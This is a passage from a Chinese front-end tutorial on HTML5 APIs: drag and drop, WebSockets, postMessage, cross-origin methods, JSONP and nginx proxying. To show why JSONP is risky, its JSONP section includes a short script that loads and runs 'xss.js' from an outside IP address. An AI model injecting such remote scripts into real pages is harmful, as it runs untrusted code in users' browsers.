class="line-number">122</span><br><span class="line-number">123</span><br><span class="line-number">124</span><br><span class="line-number">125</span><br><span class="line-number">126</span><br><span class="line-number">127</span><br></div></div><h4 id="canvas-和-svg-区别"><a href="#canvas-和-svg-区别" class="header-anchor">#</a> Canvas 和 SVG 区别</h4> <ul><li>Canvas 是一种<strong>通过 JavaScript 来绘制 2D 图形</strong>的方法。<strong>Canvas 是逐像素来进行渲染的，因此当我们对 Canvas 进行缩放时，会出现锯齿或者失真的情况</strong>。</li> <li>SVG 是一种<strong>使用 XML 描述 2D 图形的语言</strong>。SVG 基于 XML，这意味着 SVG DOM 中的每个元素都是可用的。我们可以为某个元素附加 JavaScript 事件监听函数。<strong>并且 SVG 保存的是图形的绘制方法，因此当 SVG 图形缩放时并不会失真</strong>。</li></ul> <h3 id="_3-drag-api拖放"><a href="#_3-drag-api拖放" class="header-anchor">#</a> 3:Drag API拖放</h3> <h4 id="draggable属性"><a href="#draggable属性" class="header-anchor">#</a> <strong>draggable属性</strong></h4> <p>如果网页元素的<strong>draggable元素为true</strong>，这个元素就是可以拖动的。拖动过程会触发很多事件，主要有下面这些：</p> <ul><li>dragstart：网页元素开始拖动时触发。</li> <li>drag：被拖动的元素在拖动过程中持续触发。</li> <li>dragenter：被拖动的元素进入目标元素时触发，应在目标元素监听该事件。</li> <li>dragleave：被拖动的元素离开目标元素时触发，应在目标元素监听该事件。</li> <li>dragover：被拖动元素停留在目标元素之中时持续触发，应在目标元素监听该事件。</li> <li>drap：被拖动元素或从文件系统选中的文件，拖放落下时触发。</li> <li>dragend：网页元素拖动结束时触发。</li></ul> <h4 id="datatransfer对象"><a href="#datatransfer对象" class="header-anchor">#</a> <strong>dataTransfer对象</strong></h4> <p>拖动过程中，回调函数接受的事件参数，有一个dataTransfer属性，指向一个对象，包含与拖动相关的各种信息。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span>div draggable<span class="token operator">=</span><span class="token string">&quot;true&quot;</span><span class="token operator">&gt;</span>Draggable Div<span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>

draggableElement<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'dragstart'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    event<span class="token punctuation">.</span>dataTransfer<span class="token punctuation">.</span><span class="token function">setData</span><span class="token punctuation">(</span><span class="token string">'text'</span><span class="token punctuation">,</span> <span class="token string">'Hello World!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
draggableElement<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'dragstart'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">event<span class="token punctuation">,</span> dragData</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    event<span class="token punctuation">.</span>dataTransfer<span class="token punctuation">.</span><span class="token function">setData</span><span class="token punctuation">(</span><span class="token string">'text'</span><span class="token punctuation">,</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>dragData<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
draggableElement<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'dragend'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    event<span class="token punctuation">.</span>dataTransfer<span class="token punctuation">.</span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token string">'text'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><h4 id="拖拽实践"><a href="#拖拽实践" class="header-anchor">#</a> <strong>拖拽实践</strong></h4> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token function-variable function">onDragStart</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">event<span class="token punctuation">,</span> dragData</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>
    navigator<span class="token punctuation">.</span>userAgent<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'Trident'</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span>
    navigator<span class="token punctuation">.</span>userAgent<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'rv:11.0'</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token operator">-</span><span class="token number">1</span>
  <span class="token punctuation">)</span> <span class="token punctuation">{</span>
    event<span class="token punctuation">.</span>dataTransfer<span class="token punctuation">.</span><span class="token function">setData</span><span class="token punctuation">(</span><span class="token string">'text'</span><span class="token punctuation">,</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>dragData<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    event<span class="token punctuation">.</span>dataTransfer<span class="token punctuation">.</span><span class="token function">setData</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>dragData<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token function-variable function">onDragEnd</span> <span class="token operator">=</span> <span class="token parameter">event</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  event<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  event<span class="token punctuation">.</span><span class="token function">stopPropagation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> <span class="token punctuation">{</span> condList <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">;</span>
  <span class="token keyword">let</span> dragData <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>
    navigator<span class="token punctuation">.</span>userAgent<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'Trident'</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span>
    navigator<span class="token punctuation">.</span>userAgent<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'rv:11.0'</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token operator">-</span><span class="token number">1</span>
  <span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> data <span class="token operator">=</span> event<span class="token punctuation">.</span>dataTransfer<span class="token punctuation">.</span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token string">'text'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>data<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>
    dragData <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> data <span class="token operator">=</span> event<span class="token punctuation">.</span>dataTransfer<span class="token punctuation">.</span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>data<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>
    dragData <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    dragActive<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
    condList<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token operator">...</span>condList<span class="token punctuation">,</span> dragData<span class="token punctuation">]</span><span class="token punctuation">,</span>
    isFirstLoading<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token operator">&lt;</span>div
className<span class="token operator">=</span><span class="token string">&quot;margin-left-10&quot;</span>
draggable<span class="token operator">=</span><span class="token punctuation">{</span><span class="token boolean">true</span><span class="token punctuation">}</span>
onDragStart<span class="token operator">=</span><span class="token punctuation">{</span><span class="token parameter">e</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  e<span class="token punctuation">.</span><span class="token function">stopPropagation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">onDragStart</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token punctuation">{</span>
  ruleType<span class="token operator">:</span> <span class="token string">'oper'</span><span class="token punctuation">,</span>
  ruleValue<span class="token operator">:</span> <span class="token string">'('</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">}</span>
  <span class="token operator">&gt;</span>

    <span class="token operator">&lt;</span>div
className<span class="token operator">=</span><span class="token punctuation">{</span><span class="token function">classnames</span><span class="token punctuation">(</span>styles<span class="token punctuation">.</span>droppableBox<span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token punctuation">[</span>styles<span class="token punctuation">.</span>active<span class="token punctuation">]</span><span class="token operator">:</span> dragActive <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span>
<span class="token punctuation">{</span><span class="token operator">...</span><span class="token punctuation">(</span>draging
     <span class="token operator">?</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
     <span class="token operator">:</span> <span class="token punctuation">{</span>
  <span class="token function-variable function">onDragEnter</span><span class="token operator">:</span> <span class="token parameter">event</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    event<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    event<span class="token punctuation">.</span><span class="token function">stopPropagation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
      dragActive<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token function-variable function">onDragLeave</span><span class="token operator">:</span> <span class="token parameter">event</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    event<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    event<span class="token punctuation">.</span><span class="token function">stopPropagation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
      dragActive<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token function-variable function">onDragOver</span><span class="token operator">:</span> <span class="token parameter">event</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    event<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    event<span class="token punctuation">.</span><span class="token function">stopPropagation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
      dragActive<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  onDrop<span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>onDragEnd<span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span>
<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br></div></div><h3 id="_4-websockets-api-http1-1"><a href="#_4-websockets-api-http1-1" class="header-anchor">#</a> 4:WebSockets API～http1.1</h3> <p>WebSockets是html5中最强大的通信功能，<strong>它定义了一个全双工通信信道</strong>，仅通过Web上的一个Socket即可进行通信。属于应用层协议。它基于TCP传输协议，并复用HTTP的握手通道。<strong>浏览器和服务器只需要完成一次握手，两者之间就直接可以创建持久性的连接， 并进行双向数据传输。</strong></p> <p>**WebSocket 的出现就解决了半双工通信的弊端。它最大的特点是：**服务器可以向客户端主动推动消息，客户端也可以主动向服务器推送消息。</p> <h4 id="跨文档消息传递"><a href="#跨文档消息传递" class="header-anchor">#</a> 跨文档消息传递</h4> <ul><li>存储；</li> <li>Iframe;</li> <li>Websocket;</li></ul> <p>iframe事件：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>window<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">'Hello, world'</span><span class="token punctuation">,</span> <span class="token string">'http://www.example.com/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">&quot;message&quot;</span><span class="token punctuation">,</span> messageHandler<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">messageHandler</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">switch</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>origin<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">case</span> <span class="token string">&quot;friend.example.com&quot;</span><span class="token operator">:</span>
        <span class="token function">processMessage</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 处理消息</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">default</span><span class="token operator">:</span> 
        <span class="token comment">// 消息来源无法识别</span>
        <span class="token comment">// 消息被忽略</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><p>在客户端中：</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// 在index.html中直接写WebSocket，设置服务端的端口号为 9999</span>
<span class="token keyword">let</span> ws <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocket</span><span class="token punctuation">(</span><span class="token string">'ws://localhost:9999'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 在客户端与服务端建立连接后触发</span>
ws<span class="token punctuation">.</span><span class="token function-variable function">onopen</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;Connection open.&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    ws<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'hello'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token comment">// 在服务端给客户端发来消息的时候触发</span>
ws<span class="token punctuation">.</span><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// 打印的是MessageEvent对象</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 打印的是收到的消息</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token comment">// 在客户端与服务端建立关闭后触发</span>
ws<span class="token punctuation">.</span><span class="token function-variable function">onclose</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">evt</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;Connection closed.&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span> 
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><h4 id="iframe的缺点"><a href="#iframe的缺点" class="header-anchor">#</a> iframe的缺点</h4> <ul><li>iframe会<strong>阻塞主页面的Onload事件</strong>；搜索引擎的检索程序无法解读这种页面，<strong>不利于SEO</strong>;</li> <li>iframe和主页面共享连接池，而浏览器对相同域的连接有限制，所以<strong>会影响页面的并行加载</strong>。</li></ul> <p>使用iframe之前需要考虑这两个缺点。如果需要使用iframe，<strong>最好是通过javascript动态给iframe添加src属性值</strong>，这样可以绕开以上两个问题。现在html5还是保留iframe属性；【可以参考下面jsonp的实现】</p> <h4 id="解决跨域问题【要点】"><a href="#解决跨域问题【要点】" class="header-anchor">#</a> 解决跨域问题【要点】</h4> <p><strong>同源策略</strong>：简单来说，只有当协议，域名，端口号相同的时候才算是同一个域名，否则，均认为需要做跨域处理</p> <blockquote><p>jsonp、 iframe、window.name、window.postMessage、服务器上设置代理页面</p></blockquote> <ol><li>jsonp跨域访问;</li> <li>nginx代理跨域;</li> <li>WebSocket协议跨域；</li> <li>nodejs中间件代理跨域； <strong>【开发模式的话：有webpack proxy, html-middle, 浏览器代理启动(不能处理cookie)】;</strong></li> <li>跨域资源共享（<strong>CORS</strong>）; 普通跨域请求：只服务端设置Access-Control-Allow-Origin即可，前端无须设置，若要带cookie请求：前后端都需要设置。</li> <li>html5中的window.postMessage方法;</li> <li><strong>http头部信息中加入origin</strong>;</li> <li><strong>window.name + iframe跨域;</strong></li> <li>document.domain + iframe跨域;</li> <li>location.hash + iframe;</li></ol> <h5 id="jsonp-核心原理"><a href="#jsonp-核心原理" class="header-anchor">#</a> <strong>JSONP 核心原理</strong></h5> <blockquote><p><strong>script 标签不受同源策略约束，所以可以用来进行跨域请求，优点是兼容性好，但是只能用于 GET 请求；</strong></p></blockquote> <p>缺点：</p> <p>它只支持<code>GET</code>请求，而不支持<code>POST</code>请求等其他类型的HTTP请求。<strong>不处理好的会触发XSS攻击</strong>；</p> <ul><li><strong>只能发送 get 请求</strong> 不支持 post、put、delete；</li> <li>不安全，容易引发 xss 攻击，别人在返回的结果中返回了下面代码。</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">let</span> script <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
script<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">&quot;http://192.168.0.57:8080/xss.js&quot;</span><span class="token punctuation">;</span>
document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>script<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p><strong>会把别人的脚本引入到自己的页面中执行，如：弹窗、广告等，甚至更危险的脚本程序</strong>。</p> <p>封装：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> <span class="token function-variable function">jsonp</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">{</span> url<span class="token punctuation">,</span> params<span class="token punctuation">,</span> callbackName <span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> <span class="token function-variable function">generateUrl</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> dataSrc <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> params<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>params<span class="token punctuation">.</span><span class="token function">hasOwnProperty</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        dataSrc <span class="token operator">+=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>key<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>params<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&amp;</span><span class="token template-punctuation string">`</span></span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    dataSrc <span class="token operator">+=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">callback=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>callbackName<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span>
    <span class="token keyword">return</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>url<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">?</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>dataSrc<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> scriptEle <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span>
    scriptEle<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token function">generateUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>scriptEle<span class="token punctuation">)</span>
    window<span class="token punctuation">[</span>callbackName<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token parameter">data</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token function">resolve</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
      document<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>scriptEle<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br></div></div><h5 id="nginx的设置反向代理转发"><a href="#nginx的设置反向代理转发" class="header-anchor">#</a> <strong>nginx的设置反向代理转发</strong></h5> <blockquote><p>fq的原理，正向代理；</p></blockquote> <div class="language-nginx line-numbers-mode"><pre class="language-nginx"><code><span class="token keyword">server</span> <span class="token punctuation">{</span>
    <span class="token keyword">listen</span>       <span class="token number">80</span><span class="token punctuation">;</span>
    <span class="token keyword">server_name</span>  fe<span class="token punctuation">.</span><span class="token keyword">server</span><span class="token punctuation">.</span>com<span class="token punctuation">;</span>
    <span class="token keyword">location</span> <span class="token operator">/</span>api <span class="token punctuation">{</span>
        <span class="token keyword">proxy_pass</span> dev<span class="token punctuation">.</span><span class="token keyword">server</span><span class="token punctuation">.</span>com<span class="token punctuation">;</span>
       <span class="token comment"># proxy_pass  http://127.0.0.1:3000;</span>
        <span class="token keyword">proxy_redirect</span>     off<span class="token punctuation">;</span>
        <span class="token keyword">proxy_set_header</span>   Host             <span class="token variable">$host</span><span class="token punctuation">;</span>        <span class="token comment"># 传递域名</span>
        <span class="token keyword">proxy_set_header</span>   X<span class="token operator">-</span>Real<span class="token operator">-</span>IP        <span class="token variable">$remote_addr</span><span class="token punctuation">;</span> <span class="token comment"># 传递ip</span>
